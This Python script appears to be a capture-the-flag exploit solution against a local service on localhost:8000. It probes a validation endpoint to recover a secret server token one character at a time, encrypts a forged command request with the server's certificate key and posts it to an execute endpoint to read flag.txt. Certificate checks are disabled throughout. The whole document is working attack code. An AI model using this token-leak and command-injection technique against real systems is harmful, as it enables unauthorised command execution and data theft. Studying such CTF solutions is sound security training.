import requests
import string
import random
import json
import base64
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from bitstring import BitArray, Bits
from cryptography.x509 import load_der_x509_certificate
from cryptography.hazmat.primitives.asymmetric import padding

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


CHARS = string.ascii_letters + string.digits
COMMAND = 'ls '
HOOK = 'validation-token-'


def find_limit():
    random_text = ''.join([random.sample(CHARS, 1)[0] for _ in range(400)])
    while True:
        print(f"[{len(random_text)}]: {random_text[:50]}...", end='\r')
        
        request_text = COMMAND + HOOK + random_text
        response = requests.post('https://localhost:8000/validate', request_text, verify=False)
        if response.status_code == 200:
            print(f"[{len(random_text)}]: {random_text}")
            return random_text

        random_text = random_text[:-1]


def find_token(random_padding):
    token_prefix = ''
    while True:
        for c in CHARS:
            total_text = COMMAND + HOOK + token_prefix + c + random_padding
            print(f"[{len(token_prefix):02}]: {token_prefix}{c}", end='\r')
            response = requests.post('https://localhost:8000/validate', total_text, verify=False)
            if response.status_code == 200:
                token_prefix = token_prefix + c
                break
        else:
            print(f"[{len(token_prefix):02}]: {token_prefix}")
            return HOOK + token_prefix


def get_ssl_cert():
    with requests.get("https://localhost:8000", stream=True, verify=False) as response:
        certificate_info_raw = response.raw.connection.sock.getpeercert(True)
        return load_der_x509_certificate(certificate_info_raw)


def request(token):
    return json.dumps({
        "server_token": token,
        "command": "cat",
        "param": "flag.txt",
    })


def compress(data):
    array = BitArray(len(data).to_bytes(4, 'big'))
    for c in data:
        array += Bits(bool=False)
        array += Bits(bytes(c, 'utf8'))
    return array.tobytes()


def execution_token(token):
    json_request = request(token)
    compressed = compress(json_request)
    data = encrypt(compressed)
    base64_encoded = base64.b64encode(data)
    return base64_encoded


def encrypt(text):
    cert = get_ssl_cert()
    key = cert.public_key()
    return key.encrypt(text, padding.PKCS1v15())


if __name__ == "__main__":
    text = find_limit()
    token = find_token(text)
    execution_token = execution_token(token)
    result = requests.post("https://localhost:8000/execute", execution_token, verify=False)
    print()
    print(result.text)
